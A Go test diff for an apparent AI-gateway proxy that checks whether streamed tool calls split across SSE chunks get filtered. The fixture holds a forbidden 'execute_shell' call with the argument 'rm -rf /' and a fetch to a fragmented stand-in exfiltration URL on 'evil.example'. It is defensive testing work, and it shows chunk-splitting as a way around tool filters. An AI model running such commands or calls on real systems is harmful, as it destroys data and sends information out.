@@ -244,6 +244,62 @@ func TestSSECanaryLeakImmediateTruncation(t *testing.T) {
 	}
 }
 
+func TestSSEFragmentedToolCallsAcrossChunksAndDomainDetection(t *testing.T) {
+	cfg := config.DefaultConfig()
+	cfg.ApplyPreset()
+	cfg.Whitelist.EnforceToolWhitelist = true
+	cfg.Whitelist.AllowedTools = []string{"fetch_safe"}
+	cfg.Whitelist.AllowedDomains = []string{"*.trusted.com"}
+
+	// Stream with:
+	// 1. Tool call 0: forbidden tool "execute_shell", split across chunk 1 (name) and chunk 2 (arguments)
+	// 2. Tool call 1: allowed tool "fetch_safe", but URL split across chunk 2 ("https://ev") and chunk 3 ("il.example/exfil")
+	sseStream := strings.Join([]string{
+		`data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_0","type":"function","function":{"name":"execute_shell","arguments":""}}]}}]}`,
+		"",
+		`data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"arguments":"{\"cmd\":\"rm -rf /\"}"}},{"index":1,"id":"call_1","type":"function","function":{"name":"fetch_safe","arguments":"{\"url\":\"https://ev"}}]}}]}`,
+		"",
+		`data: {"choices":[{"index":0,"delta":{"tool_calls":[{"index":1,"function":{"arguments":"il.example/exfil\"}"}}]}}]}`,
+		"",
+		`data: [DONE]`,
+		"",
+	}, "\n")
+
+	trailers := make(http.Header)
+	inspector := NewSSEInspector(
+		io.NopCloser(strings.NewReader(sseStream)),
+		&cfg,
+		guards.NewPIIVault(),
+		guards.InspectionResult{Status: "CLEAN", Severity: "NONE"},
+		trailers,
+	)
+
+	outBytes, err := io.ReadAll(inspector)
+	if err != nil {
+		t.Fatal(err)
+	}
+	output := string(outBytes)
+
+	// 1. Forbidden tool execute_shell should be completely pruned, including its arguments in chunk 2!
+	if strings.Contains(output, "execute_shell") || strings.Contains(output, "rm -rf") {
+		t.Fatalf("SECURITY FAILURE: forbidden tool call fragments survived in SSE output:\n%s", output)
+	}
+
+	// 2. Fragmented domain "https://ev" + "il.example/exfil" must be caught across chunks
+	codesTrailer := trailers.Get("X-JaguarGate-Codes")
+	if !strings.Contains(codesTrailer, "JG-CFG-103") {
+		t.Errorf("expected JG-CFG-103 for fragmented evil.example domain, got %q", codesTrailer)
+	}
+	if !strings.Contains(codesTrailer, "JG-CFG-101") {
+		t.Errorf("expected JG-CFG-101 for pruned execute_shell, got %q", codesTrailer)
+	}
+
+	// 3. Verify evil.example is replaced with blocked domain in output
+	if strings.Contains(output, "il.example/exfil") {
+		t.Errorf("SECURITY FAILURE: fragmented forbidden domain survived in SSE output:\n%s", output)
+	}
+}
+
 func BenchmarkSSERuneSlidingWindow(b *testing.B) {
 	cfg := config.DefaultConfig()
 	cfg.ApplyPreset()
